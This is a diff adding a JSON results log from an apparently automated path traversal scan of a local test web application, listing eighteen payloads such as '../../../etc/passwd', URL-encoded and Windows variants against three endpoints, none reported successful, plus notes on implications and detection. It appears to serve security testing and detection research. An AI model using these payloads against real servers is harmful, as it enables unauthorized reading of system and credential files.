@@ -1,0 +1,168 @@
+{
+  "attack_type": "Path Traversal",
+  "timestamp": "2025-10-16T02:39:14.849604",
+  "target": "http://localhost:3000",
+  "summary": {
+    "total_payloads_tested": 18,
+    "vulnerabilities_found": 0,
+    "success_rate": 0.0
+  },
+  "detailed_results": [
+    {
+      "endpoint": "/rest/product/image?url=",
+      "payload": "../../../etc/passwd",
+      "status_code": 500,
+      "response_length": 4943,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:04.647588"
+    },
+    {
+      "endpoint": "/rest/product/image?url=",
+      "payload": "../../../../windows/win.ini",
+      "status_code": 500,
+      "response_length": 4959,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:05.161805"
+    },
+    {
+      "endpoint": "/rest/product/image?url=",
+      "payload": "....//....//....//etc/passwd",
+      "status_code": 500,
+      "response_length": 4955,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:05.688324"
+    },
+    {
+      "endpoint": "/rest/product/image?url=",
+      "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "status_code": 500,
+      "response_length": 5023,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:06.239025"
+    },
+    {
+      "endpoint": "/rest/product/image?url=",
+      "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "status_code": 500,
+      "response_length": 5019,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:06.810168"
+    },
+    {
+      "endpoint": "/rest/product/image?url=",
+      "payload": "....\\....\\....\\windows\\win.ini",
+      "status_code": 500,
+      "response_length": 4981,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:07.367703"
+    },
+    {
+      "endpoint": "/api/Products/file?path=",
+      "payload": "../../../etc/passwd",
+      "status_code": 404,
+      "response_length": 35,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:08.003211"
+    },
+    {
+      "endpoint": "/api/Products/file?path=",
+      "payload": "../../../../windows/win.ini",
+      "status_code": 404,
+      "response_length": 35,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:08.553118"
+    },
+    {
+      "endpoint": "/api/Products/file?path=",
+      "payload": "....//....//....//etc/passwd",
+      "status_code": 404,
+      "response_length": 35,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:09.207626"
+    },
+    {
+      "endpoint": "/api/Products/file?path=",
+      "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "status_code": 404,
+      "response_length": 35,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:09.850884"
+    },
+    {
+      "endpoint": "/api/Products/file?path=",
+      "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "status_code": 404,
+      "response_length": 35,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:10.411513"
+    },
+    {
+      "endpoint": "/api/Products/file?path=",
+      "payload": "....\\....\\....\\windows\\win.ini",
+      "status_code": 404,
+      "response_length": 35,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:10.959170"
+    },
+    {
+      "endpoint": "/assets/images/",
+      "payload": "../../../etc/passwd",
+      "status_code": 200,
+      "response_length": 75088,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:11.528714"
+    },
+    {
+      "endpoint": "/assets/images/",
+      "payload": "../../../../windows/win.ini",
+      "status_code": 200,
+      "response_length": 75088,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:12.130099"
+    },
+    {
+      "endpoint": "/assets/images/",
+      "payload": "....//....//....//etc/passwd",
+      "status_code": 200,
+      "response_length": 75088,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:12.692707"
+    },
+    {
+      "endpoint": "/assets/images/",
+      "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "status_code": 200,
+      "response_length": 75088,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:13.223974"
+    },
+    {
+      "endpoint": "/assets/images/",
+      "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "status_code": 200,
+      "response_length": 75088,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:13.810726"
+    },
+    {
+      "endpoint": "/assets/images/",
+      "payload": "....\\....\\....\\windows\\win.ini",
+      "status_code": 200,
+      "response_length": 75088,
+      "sensitive_data_indicated": false,
+      "timestamp": "2025-10-16T02:39:14.348923"
+    }
+  ],
+  "security_implications": [
+    "Unauthorized access to sensitive files",
+    "System information disclosure",
+    "Potential credential theft",
+    "Complete system compromise in some cases"
+  ],
+  "ai_detection_considerations": [
+    "Pattern matching for directory traversal sequences",
+    "Length and complexity analysis of file paths",
+    "Behavioral analysis of file access patterns",
+    "Anomaly detection in file request parameters"
+  ]
+}
